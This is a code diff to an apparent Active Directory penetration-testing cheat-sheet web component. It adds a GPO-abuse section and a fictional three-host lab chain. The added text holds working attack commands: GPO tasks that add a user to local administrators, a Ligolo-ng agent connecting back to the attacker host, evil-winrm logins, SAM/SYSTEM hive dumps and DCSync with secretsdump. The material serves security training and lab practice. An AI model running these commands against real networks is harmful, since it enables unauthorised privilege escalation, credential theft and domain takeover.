@@ -18,8 +18,8 @@ export class ActiveDirectory implements OnInit {
 
   selectedService: string | null = 'full-ad-compromise-linux';
   readonly sections: SectionIndexItem[] = [
-    { id: 'full-ad-compromise-linux', label: 'Kali Single-Host Flow', group: 'AD Flow' },
-    { id: 'ad-flow', label: 'Windows Pivot Flow', group: 'AD Flow' },
+    { id: 'full-ad-compromise-linux', label: 'Kali Single-Host Flow', group: 'AD Flow', important: true },
+    { id: 'ad-flow', label: 'Windows Pivot Flow', group: 'AD Flow', important: true },
     { id: 'windows', label: 'Windows Commands', group: 'Enumeration' },
     { id: 'powerview', label: 'PowerView', group: 'Enumeration' },
     { id: 'manual', label: 'Manual Enumeration', group: 'Enumeration' },
@@ -32,9 +32,10 @@ export class ActiveDirectory implements OnInit {
     { id: 'passwords', label: 'Password Attacks', group: 'Attacking' },
     { id: 'adcs', label: 'AD Certificate Services (ADCS)', group: 'Attacking' },
     { id: 'dcom', label: 'DCOM Lateral Movement', group: 'Attacking' },
+    { id: 'gpo-abuse', label: 'GPO Abuse', group: 'Attacking' },
     { id: 'post-exploitation-checklist', label: 'Post-Compromise Checklist', group: 'Post-Exploitation' },
     { id: 'compromise', label: 'Domain Compromise', group: 'Attacking' },
-    { id: 'ad-example-three-host', label: 'Three-Host Domain Chain', group: 'Examples' },
+    { id: 'ad-example-three-host', label: 'Three-Host Domain Chain', group: 'Examples', important: true },
     { id: 'planned-privesc', label: 'Privilege Escalation', group: 'Coming later', disabled: true }
   ];
   selectedFlowPhase = '';
@@ -924,6 +925,53 @@ $dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c whoami", "7")
 `;
 
   // =========================================================
+  // GPO ABUSE
+  // =========================================================
+
+  gpoEnumeration = String.raw`# List every GPO in the domain and who can edit it
+Get-DomainGPO | select displayname, gpcfilesyspath
+
+# Resolve which OUs / users / computers a given GPO applies to
+Get-DomainOU | Get-DomainGPO -ResolveLinks | select displayname
+
+# Find GPOs the current user can modify (GenericWrite / WriteProperty / WriteDacl)
+Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | ? {
+  $_.SecurityIdentifier -match $(ConvertTo-SID '<CURRENT_USER>')
+}
+
+# BloodHound: look for "WriteGPLink" / "GPLink" / GenericAll on OU edges
+# and for Users/Computers in scope of a modifiable GPO
+`;
+
+  gpoAbuseSharpGpo = String.raw`# SharpGPOAbuse adds a malicious computer/user startup task to a GPO the
+# compromised principal can already edit, then forces policy refresh.
+
+SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" \
+  --Author <DOMAIN>\<USER> \
+  --Command "cmd.exe" \
+  --Arguments "/c net localgroup administrators <DOMAIN>\\<USER> /add" \
+  --GPOName "<TARGET_GPO_NAME>"
+
+# On the target (or wait for the ~90-120 min default refresh interval)
+gpupdate /force
+
+# Verify the new local administrator on an affected computer
+net localgroup administrators
+`;
+
+  gpoImmediateTask = String.raw`# Alternative: push a GPO "Immediate Task" via PowerView when SharpGPOAbuse
+# is not available (requires GenericWrite/WriteProperty on the GPO object)
+
+New-GPOImmediateTask -TaskName "Updater" -Command "cmd.exe" \
+  -CommandArguments "/c net localgroup administrators <DOMAIN>\\<USER> /add" \
+  -GPOname "<TARGET_GPO_NAME>" -Force
+
+# Always confirm GPO scope (linked OU, enforced/blocked inheritance,
+# WMI/security filtering) before relying on this to affect a specific host
+gpresult /r
+`;
+
+  // =========================================================
   // POST-COMPROMISE CHECKLIST
   // =========================================================
 
@@ -1239,6 +1287,78 @@ nmap -sCV -p PORTS -n -Pn TARGET_IP -oN pivotServices
 # should be reused on another without authorization.
 `;
 
+  // =========================================================
+  // EXAMPLE: THREE-HOST DOMAIN CHAIN (fictional lab data)
+  // =========================================================
+
+  examplePowerShellHistory = `
+# Review the PowerShell history left by a previous administrative session
+type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
+
+# Fictional lab finding recovered from the history file:
+# net use \\\\APP02\\C$ /user:CORP\\svc_backup "B4ckup$2024!"
+#
+# The history only reveals a credential; it does not grant privileges
+# by itself. Validate real escalation paths with the Windows PrivEsc guide.
+`;
+
+  exampleWebToAppPivot = `
+# WEB01 (DMZ, 10.10.10.21) can reach the internal 10.10.20.0/24 segment
+# that is not directly reachable from Kali. Pivot through WEB01 first.
+
+# Start the Ligolo-ng proxy on Kali
+sudo ./proxy -selfcert
+
+# Upload and run the Windows agent on WEB01, connecting back to Kali
+./agent.exe -connect KALI_IP:11601 -ignore-cert
+
+# On the Ligolo-ng proxy console
+session       # select the WEB01 session
+start         # open the tunnel
+
+# Add the route to the internal segment on Kali
+sudo ip route add 10.10.20.0/24 dev ligolo
+`;
+
+  exampleApp02Login = `
+# Through the WEB01 tunnel, connect to APP02 with the credential
+# recovered from the PowerShell history
+evil-winrm -i 10.10.20.22 -u svc_backup -p 'B4ckup$2024!'
+`;
+
+  exampleApp02CredentialFinding = `
+# APP02 grants svc_backup the SeBackupPrivilege / SeRestorePrivilege tokens
+whoami /priv
+
+# Use the existing SeBackup/SeRestore technique (Windows PrivEsc) to dump
+# the local SAM/SYSTEM hives and recover cached credential material
+reg save HKLM\\SAM C:\\Temp\\SAM
+reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
+# Fictional lab finding inside the recovered Credential Manager vault:
+# CORP\\svc_adcs : "C3rtSvc#2024!"
+# svc_adcs is later confirmed to hold "Replicating Directory Changes"
+# rights once APP03 is reached.
+`;
+
+  exampleApp03Login = `
+# Through the second tunnel (APP02 -> APP03), connect with the
+# svc_adcs credential recovered on APP02
+evil-winrm -i 10.10.30.23 -u svc_adcs -p 'C3rtSvc#2024!'
+`;
+
+  exampleDcsyncFinding = `
+# Confirm svc_adcs effective replication rights before running DCSync
+impacket-secretsdump CORP.LOCAL/svc_adcs:'C3rtSvc#2024!'@10.10.10.10 -just-dc
+
+# Fictional lab finding (redact/rotate in a real engagement):
+# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:...:::
+#
+# Local Administrator membership alone does not grant DCSync; the
+# directory replication rights are what make this step possible.
+`;
 
   // Full AD Compromise from Linux
 
